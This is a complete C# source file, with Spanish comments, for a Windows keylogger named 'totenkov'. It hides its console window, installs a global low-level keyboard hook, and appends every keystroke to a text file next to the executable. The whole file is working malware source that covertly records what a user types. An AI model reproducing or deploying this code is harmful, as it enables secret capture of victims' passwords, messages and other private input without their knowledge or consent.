using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace totenkov
{
    class Program
    {
        public const int WH_KEYBOARD_DLL = 13; //para capturar metodos del teclado
        private const int WJ_KEYDOWN = 0x0100; //para capturar la tecla presionada
        private static LowLevelKeyboardProc _proc = HookCallBack;
        private static IntPtr _hookId = IntPtr.Zero; //apuntador de seguimiento

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); //recibe 3 parametros

        //Librerias externas referenciadas con []

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
      IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // los dos más importantes 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            _hookId = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookId);
        }

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam) //generando Callback (el que captura y guarda)
        {
            if (nCode >= 0 && wParam == (IntPtr)WJ_KEYDOWN) //IntPtr - captura la tecla en el punto de presion (apuntador de memoria en C#)
            {
                int vkCode = Marshal.ReadInt32(lParam); //Caracter que presionamos (captura-posicion de memoria)

                System.Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\totenkov.txt", true); //ruta de guardado
                sw.Write((Keys)vkCode + " ");
                sw.Close();

            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curPorcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curPorcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_DLL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }


        }
    }
}
